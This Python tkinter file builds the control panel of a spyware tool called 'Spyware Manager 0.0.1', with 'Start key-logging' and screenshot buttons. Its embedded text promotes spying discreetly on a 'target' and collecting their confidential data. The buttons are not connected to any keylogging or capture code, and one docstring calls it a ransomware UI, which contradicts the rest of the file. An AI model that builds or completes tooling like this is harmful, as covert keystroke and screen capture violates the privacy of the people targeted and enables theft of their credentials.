from tkinter import *
from tkinter import ttk
import tkinter.messagebox
from tkinter import font as tkFont
from PIL import ImageTk, Image


def apply_theme(master, theme='light'):
    master.tk.call("source", "azureTheme\\azure.tcl")
    master.tk.call("set_theme", theme)


def execute_gui(gui_class, theme='light'):
    root = Tk()
    apply_theme(master=root, theme=theme)
    my_gui = gui_class(root)
    root.mainloop()


KEYLOGGER_INFO = """ Spy effectively and discretely on your target, with a 100% python made keylogger.
You can record the keys that were pressed and collect sensitive and potentially confidential 
of your target.In addition, you can get a screenshot of the target device on demand 
(assuming the device is open).
"""


class SpywareUI:
    """A ui for the ransomware program"""
    H1 = 24
    H2 = 22
    H3 = 20
    H4 = 18
    H5 = 16
    H6 = 14
    TEXT = 12

    def __init__(self, master, width=800, height=500):
        # Basic page characteristics
        self.master = master
        self.width = width
        self.height = height
        self.master.geometry(f"{self.width}x{self.height}")
        self.master.title("Spyware Manager 0.0.1")

        # menu
        self.menu = Menu(master)
        self.master.config(menu=self.menu)
        self.help_sub_menu = Menu(self.menu)
        self.help_sub_menu.add_command(label="hello")
        self.menu.add_cascade(label="Help", menu=self.help_sub_menu)

        # Adding components
        self.main_frame = Frame(master)
        self.header = Label(master, text="Spyware Manager 0.0.1", font=("Arial", self.H2))
        self.info = Label(self.main_frame, text=KEYLOGGER_INFO, font=("Arial", self.TEXT))
        self.start_key_logging_button = ttk.Button(self.main_frame, text='Start key-logging', style='Accent.TButton')
        self.screenshot_button = ttk.Button(self.main_frame, text='Get a screenshot')
        # positioning them with the grid
        self.master.columnconfigure(0, weight=1)
        self.master.columnconfigure(2, weight=1)
        self.main_frame.grid(row=1, column=1, pady=20)
        self.header.grid(row=0, column=1)
        self.info.grid(row=0, column=0, columnspan=20, ipady=10)
        self.start_key_logging_button.grid(row=1, column=9)
        self.screenshot_button.grid(row=2, column=9, pady=15)

def main():
    try:
        execute_gui(SpywareUI, theme="dark")
    except KeyboardInterrupt:
        print("program halted")


if __name__ == '__main__':
    main()
